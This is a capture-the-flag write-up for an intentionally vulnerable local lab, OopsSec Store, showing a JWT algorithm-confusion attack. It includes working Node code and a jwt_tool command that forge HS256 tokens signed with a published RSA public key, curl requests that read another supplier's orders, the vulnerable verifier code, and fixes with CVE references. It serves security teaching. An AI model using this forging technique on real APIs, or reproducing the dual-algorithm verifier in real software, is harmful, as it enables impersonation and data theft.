# One Key, Two Meanings

- **Source URL:** https://medium.com/@oopssec-store/one-key-two-meanings-jwt-algorithm-confusion-in-oopssec-store-c653d0cceb81
- **Fetched from:** https://medium.com/@oopssec-store/one-key-two-meanings-jwt-algorithm-confusion-in-oopssec-store-c653d0cceb81?source=rss-9143a4639fd4------2
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:**  (id 14885)
- **Method:** medium-rss-feed (full content:encoded) readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
- **Author/Published (RSS):** OopsSec Store / Thu, 27 Aug 2026 19:01:01 GMT

You’re going to forge a valid partner token for a supplier you were never issued credentials for — using nothing but a public key the API publishes on purpose. The vulnerability is JWT algorithm confusion: the token verifier accepts both RS256 and HS256, and both paths reach for the same key. Everything runs locally against OopsSec Store, an intentionally vulnerable lab.

You don’t need much. One command scaffolds the whole thing.

That single flow installs the dependencies, creates a local database, seeds it with test data, and serves the site.

When it finishes, open http://localhost:3000 in your browser.

Prefer not to touch Node? There’s a Docker image that gets you to the same place:

docker run -p 127.0.0.1:3000:3000 leogra/oss-oopssec-store

Either way, once localhost:3000 loads, you're ready.

OopsSec Store runs a **Partner API** for its suppliers. Scroll to the footer, find the **Partner API** link under Navigation, and you land on /partners.

It reads like any B2B integration page: what the API does, how you authenticate, an endpoint table, a webhook section, a changelog, and a directory of suppliers already plugged in. Three details on that page are the whole attack.

**Your identity is the sub claim.** The auth section says it plainly: sub is your partner ID and it decides which purchase orders you can read. No endpoint takes a ?supplierId= parameter — whoever the token says you are is who you are. So if you want someone else's data, you can't tamper with a query string. You have to change the token.

**The public key is published on purpose.** The webhook section explains why: OopsSec signs webhook callbacks with the same key pair that signs access tokens, so partners can verify them. That means the public key is served, deliberately and permanently, at two spots:

**Two algorithms are accepted.** The changelog gives it away. v2 (current) signs tokens with RS256. v1 (deprecated) used HS256 with a shared secret, and the gateway *still accepts it* while old integrations migrate.

A verifier that accepts both an asymmetric algorithm (RS256) and a symmetric one (HS256) is exactly the shape you want to poke at. Hold that thought.

The partner directory tells you who else is on the API:

Those partner IDs are the values you’ll drop into sub once you can sign your own token.

Click **Generate sandbox token** on /partners, or hit the endpoint directly:

TOKEN=$(curl -s -X POST http://localhost:3000/api/partner/sandbox-token | jq -r .access\_token)

echo $TOKEN

Use it against the orders endpoint:

curl -s -H "Authorization: Bearer $TOKEN" \

http://localhost:3000/api/partner/orders | jq

```
{
  "partnerId": "SUP-SANDBOX",
  "count": 3,
  "orders": [
    {
      "purchaseOrderId": "PO-SBX-0001",
      "total": 240,
      "notes": "Sandbox fixture — not a real commitment.",
      "createdAt": "2026-08-24T19:35:03.886Z"
    },
    {
      "purchaseOrderId": "PO-SBX-0002",
      "total": 87.5,
      "notes": "Sandbox fixture — not a real commitment.",
      "createdAt": "2026-08-24T19:35:03.886Z"
    },
    {
      "purchaseOrderId": "PO-SBX-0003",
      "total": 1310.75,
      "notes": "Sandbox fixture — not a real commitment.",
      "createdAt": "2026-08-24T19:35:03.886Z"
    }
  ]
}
```
Dummy data, exactly as advertised. That’s fine — you just needed a real, server-issued token to study.

echo $TOKEN | cut -d. -f1 | base64 -d 2>/dev/null; echo

echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null; echo

```
{"alg":"RS256","typ":"JWT","kid":"pbjo4PDj4fIv6YhAIqJYRsNtKvizR6TBdQs3H3qIYrE"}
{"iss":"https://oopssec.store","sub":"SUP-SANDBOX","scope":"orders:read","iat":1787600365,"exp":1787603965}
```
sub is SUP-SANDBOX. If you open this in [jwt.io](https://www.jwt.io/) and change sub to SUP-LETTUCE, the signature breaks — you don't have the RSA private key.

But you’re not going to need it.

This is the fiddly step, and where most people quietly fail. createHmac keys on **bytes**, so your HMAC key has to be byte-for-byte what the server passes in: the full PEM, the -----BEGIN PUBLIC KEY----- header included, base64 line breaks preserved, trailing newline present. Drop one \n and the signature just won't match — with no error to tell you why.

The instructive route is to rebuild the PEM from the JWKS, since that’s what you’d do against a real target that only publishes a JWK. First, pull the JWKS:

curl -s http://localhost:3000/.well-known/jwks.json | jq

```
{
  "keys": [
    {
      "kty": "RSA",
      "n": "s798rttRAnWoWch6dlDhVuZTOD-uFHPOBJhsSBwA8zo49vzJorxfcLcrzz3hE6yj0xvmZOi6t_zFFCRPy0h4m15wxa4OoGyLnKklLDnhWUmLulh-1PqsIQq5ta-1rlK2FSNJYxb1uXmKCdsN1wOcyDT8XcoR97pEULEMXQNV5n0wQnnm2SHpLuZ5PFybbCbQ-KRf_ITHCedElGRetbX6KCNL_nbsBVY3nCaRKtnkHKd8KaRNlaT0JpJekzJxZEMnPsn_32OI-4eQKycN17aGlni6MD-V3eRtFAqi1PtytxCyiSeKVQlvShiHgaau1E2pX-ajIXXwIGmFDpKn4hxs3Q",
      "e": "AQAB",
      "use": "sig",
      "alg": "RS256",
      "kid": "pbjo4PDj4fIv6YhAIqJYRsNtKvizR6TBdQs3H3qIYrE"
    }
  ]
}
```
Node turns a JWK into an SPKI PEM with no manual DER assembly:

import crypto from "crypto";

const { keys } = await (

await fetch("http://localhost:3000/.well-known/jwks.json")

).json();

const pem = crypto

.createPublicKey({ key: keys\[0\], format: "jwk" })

.export({ type: "spki", format: "pem" });

In Python, jwcrypto does the same:

from jwcrypto import jwk

import requests

jwks = requests.get("http://localhost:3000/.well-known/jwks.json").json()

key = jwk.JWK(\*\*jwks\["keys"\]\[0\])

pem = key.export\_to\_pem() # bytes, SPKI, trailing newline included

And if the encoding fights you, take the shortcut — OopsSec serves the raw PEM, exactly as plenty of real providers do:

curl -s http://localhost:3000/.well-known/partner-signing-key.pem > key.pem

Want to be sure both routes give identical bytes?

diff \<(curl -s http://localhost:3000/.well-known/partner-signing-key.pem) key.pem && echo "identical"

Now you rewrite the header to say HS256, put whatever you want in the payload, and sign it with HMAC-SHA256 keyed on that published PEM:

import crypto from "crypto";

const BASE = "http://localhost:3000";

const TARGET = "SUP-LETTUCE";

const pem = await (

await fetch(\`${BASE}/.well-known/partner-signing-key.pem\`)

).text();

const b64 = obj => Buffer.from(JSON.stringify(obj)).toString("base64url");

const now = Math.floor(Date.now() / 1000);

const header = b64({ alg: "HS256", typ: "JWT" });

const payload = b64({

iss: "https://oopssec.store",

sub: TARGET,

scope: "orders:read",

iat: now,

exp: now + 3600,

});

const signature = crypto

.createHmac("sha256", pem)

.update(\`${header}.${payload}\`)

.digest("base64url");

console.log(\`${header}.${payload}.${signature}\`);

Two things that’ll save you a headache:

If you’d rather not write a script, jwt\_tool does the whole thing:

python3 jwt\_tool.py $TOKEN -X k -pk key.pem -I -pc sub -pv SUP-LETTUCE

Send your forged token to the exact same endpoint:

curl -s -H "Authorization: Bearer $FORGED" \

http://localhost:3000/api/partner/orders | jq

The server reads alg: HS256, computes HMAC-SHA256(public key, header.payload), gets the same value you did, and accepts. You're now Lettuce Encrypt.

Where the sandbox token gave you three fixture rows, the forged SUP-LETTUCE token gives you another supplier's real records — contract terms, landed costs, margins. And sitting in that response is your proof:

`OSS{jwt_4lg_c0nfus10n}`
That flag is how you know it worked: the server treated a token you signed with a *public* key as a legitimately authenticated request. Swap sub for SUP-001 or SUP-BRIE and the same trick reads the entire supplier base.

The whole bug is one key being asked to mean two different things.

RS256 is **asymmetric**. The private key signs, the public key verifies, and knowing the public key tells you nothing about how to sign. That asymmetry is precisely what makes it safe to publish a JWKS.

HS256 is **symmetric**. HMAC-SHA256(secret, message) is computed the same way by whoever signs and whoever verifies. There's one key, and it's supposed to be a secret.

Now look at what the verifier does. Both branches read the same variable — and that variable holds the RSA public key:

```
const algorithm = decodeSegment<{ alg?: string }>(header)?.alg;
const key = getPartnerTokenKey();
let signatureIsValid: boolean;
if (algorithm === "RS256") {
  signatureIsValid = crypto.verify(
    "RSA-SHA256",
    Buffer.from(signingInput),
    { key },
    Buffer.from(signature, "base64url")
  );
} else if (algorithm === "HS256") {
  signatureIsValid =
    crypto
      .createHmac("sha256", key)
      .update(signingInput)
      .digest("base64url") === signature;
} else {
  return null;
}
```
Under the RS256 branch, key is public verification material — perfectly safe. Under the HS256 branch, those same bytes are now "the secret" — and they're printed on a web page.

The failed assumption is simple: the developers assumed the *token* wouldn’t get to choose *how it’s verified*. But that’s exactly what alg lets it do. The token says HS256, the verifier obediently switches to HMAC, and the attacker supplies the key.

This isn’t a contrived shape. It’s what an unfinished migration looks like: the HS256 branch predates RS256, the variable that once held a per-supplier shared secret got repointed at the new key, and the branch nobody wanted to break just stayed.

This is the important one. The **verifier** decides how a token is signed — never the token.

const EXPECTED\_ALGORITHM = "RS256";

const header = decodeSegment\<{ alg?: string }>(encodedHeader);

if (header?.alg !== EXPECTED\_ALGORITHM) {

return null;

}

With a library, pass an allow-list explicitly and keep exactly one entry:

`jwt.verify(token, publicKey, { algorithms: ["RS256"] });`
An allow-list with two families in it — \["RS256", "HS256"\] — *is* this vulnerability, just spelled differently. That array usually gets added during a migration and then forgotten. CVE-2015-9235 and CVE-2022-23540 are both this exact bug at library level.

const PARTNER\_SIGNING\_PRIVATE\_KEY = getPartnerPrivateKey();

const PARTNER\_VERIFICATION\_PUBLIC\_KEY = getPartnerTokenKey();

Never a generic key that both paths reach for. This is the structural fix, not just the tactical one: one variable per role, one call site each, types that don't interchange — and the bug becomes unwriteable. If a migration genuinely needs two algorithms at once, give each its own verifier function with its own key variable, and choose between them on something the attacker doesn't control (the API version in the URL, or a kid looked up in a key store that records which algorithm the key is allowed to use).

Algorithm confusion is why the JWT libraries you use ship with algorithms allow-lists and loudly refuse to guess — the ecosystem got burned (CVE-2015-9235, CVE-2022-23540) and hard-coded the lesson.

The thing worth internalizing: a published public key is not a leak. JWKS endpoints exist precisely so anyone can verify. What turns “public” into “dangerous” is a single code path willing to treat that public key as a secret. Every extra alg a verifier accepts is one more way for the token to pick how it gets checked — and that choice should never be the attacker's to make.

**Do not deploy OopsSec Store on a production server.** This application is intentionally vulnerable and should only be used in isolated, local environments for educational purposes.

**Do not exploit vulnerabilities on systems you don’t have explicit authorization to test.** Unauthorized access to computer systems is illegal. Always obtain proper permission before performing security testing.

**AI assistance was used in the writing of this writeup.**

Having trouble following this writeup? Found a typo or have suggestions for improvement?

Feel free to [open an issue](https://github.com/kOaDT/oss-oopssec-store/issues) or [start a discussion](https://github.com/kOaDT/oss-oopssec-store/discussions) on GitHub.

👉 If you find this project useful, consider giving it a star or forking it to show support!
